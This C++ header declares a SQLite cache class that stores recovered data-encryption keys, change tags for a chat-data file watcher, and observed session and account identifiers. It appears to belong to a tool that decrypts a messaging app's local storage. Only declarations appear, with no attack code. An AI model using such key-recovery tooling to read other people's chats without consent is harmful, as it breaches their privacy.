// dek_cache.hpp - program-local SQLite cache of recovered DEKs + file tags.
// Uses the OS winsqlite3.dll (loaded dynamically) so there is no 3rd-party dep.
#pragma once
#include "common.hpp"
#include "oracle.hpp"

namespace kw {

class DekCache {
  public:
    ~DekCache();
    bool init(const wstring& dbPath); // opens/creates cache.db, creates schema

    // Store a verified DEK (idempotent by rel path). Returns true if newly armed.
    bool put_dek(const DekHit& hit);
    bool has_dek(const string& rel);
    int count_armed();

    // File-change tags for the chat_data watcher.
    void touch_tag(const string& rel, const char* state);

    // Latest process-observed session state and non-secret account identifiers.
    void put_session(const string& state, const string& profileId, const string& hashedTalkUserId);

  private:
    bool exec(const char* sql);
    bool has_dek_locked(const string& rel);
    void* db_ = nullptr; // sqlite3*
    std::mutex mu_;
};

} // namespace kw
